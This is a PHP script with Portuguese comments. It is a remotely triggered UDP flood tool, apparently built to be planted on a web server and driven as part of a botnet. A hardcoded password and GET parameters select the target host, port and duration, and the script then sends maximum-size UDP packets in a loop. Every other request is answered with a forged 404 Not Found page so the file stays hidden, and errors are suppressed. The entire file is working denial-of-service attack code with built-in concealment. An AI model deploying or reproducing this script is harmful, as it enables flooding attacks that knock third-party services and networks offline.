<?php

/*********************************************************************************************************
                          INICIO CONFIGURAÇÕES
*********************************************************************************************************/
$acess_url = '09K33M3O20D0RFGHM3-DG40!203!212223KFJV9RO04ELR'; //Password - example

error_reporting(0);
ini_set('display_errors',0);
date_default_timezone_set ("America/Sao_Paulo");
set_time_limit(0);
ignore_user_abort(FALSE);


/*********************************************************************************************************
                          FIM CONFIGURAÇÕES
*********************************************************************************************************/

/*********************************************************************************************************
                          INICIO FUNÇÕES
*********************************************************************************************************/

function send_packets($dest,$port,$time,$id=NULL){

  $packets = 0;
  $timeatual = time();
  $tempo_limite = $timeatual+$time;

  for($i=0;$i<65535;$i++){
          $out .= "V";
  }
  while(1){
    $packets++;
    if(time() > $tempo_limite){
            break;
    }
    
    $fp = fsockopen("udp://$dest", $port, $errno, $errstr, 5);
    if($fp){
            fwrite($fp, $out);
            fclose($fp);
    }
  }
  return "(".$id.")Teste concluido as ".date('H:i:s')." com $packets (" . round(($packets*65)/1024, 2) . " mB) pacotes enviados a cerca de ". round($packets/$time, 2) . " pacotes/s \n";
}// end send_packets

function multiRequest($data, $options = array()) {
 
  // array of curl handles
  $curly = array();
  // data to be returned
  $result = array();
 
  // multi handle
  $mh = curl_multi_init();
 
  // loop through $data and create curl handles
  // then add them to the multi-handle
  foreach ($data as $id => $d) {
 
    $curly[$id] = curl_init();
    curl_setopt($curly[$id], CURLOPT_SSL_VERIFYPEER, false);
    $url = (is_array($d) && !empty($d['url'])) ? $d['url'] : $d;
    curl_setopt($curly[$id], CURLOPT_URL,            $url);
    curl_setopt($curly[$id], CURLOPT_HEADER,         0);
    curl_setopt($curly[$id], CURLOPT_RETURNTRANSFER, 1);
 
    // post?
    if (is_array($d)) {
      if (!empty($d['post'])) {
        curl_setopt($curly[$id], CURLOPT_POST,       1);
        curl_setopt($curly[$id], CURLOPT_POSTFIELDS, $d['post']);
      }
    }
 
    // extra options?
    if (!empty($options)) {
      curl_setopt_array($curly[$id], $options);
    }
    
    curl_multi_add_handle($mh, $curly[$id]);
  }
 
  // execute the handles
  $running = null;
  do {
    curl_multi_exec($mh, $running);
  } while($running > 0);

 
   // get content and remove handles
  foreach($curly as $id => $c) {
    $result[$id] = curl_multi_getcontent($c);
    curl_multi_remove_handle($mh, $c);
  }
 
  // all done
  curl_multi_close($mh);
 
  return $result;
}//fim multiRequest

/*********************************************************************************************************
                          FIM FUNÇÕES
*********************************************************************************************************/

if($_GET[p] === $acess_url && $_GET[r] == 's' && $_GET[dest] != NULL && $_GET[port] != NULL && $_GET[time] != NULL && $_GET[id] != NULL){

  //does the magic
  //needs curl

  //remote command 
  echo send_packets($_GET[dest],$_GET[port],$_GET[time],$_GET[id]);
  exit;

}else{

  echo '

  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
  <html><head>
  <title>404 Not Found</title>
  </head><body>
  <h1>Not Found</h1>
  <p>The requested URL '.$_SERVER ['REQUEST_URI'].' was not found on this server.</p>
  <p>Additionally, a 404 Not Found
  error was encountered while trying to use an ErrorDocument to handle the request.</p>
  </body></html>

  ';
}

?>

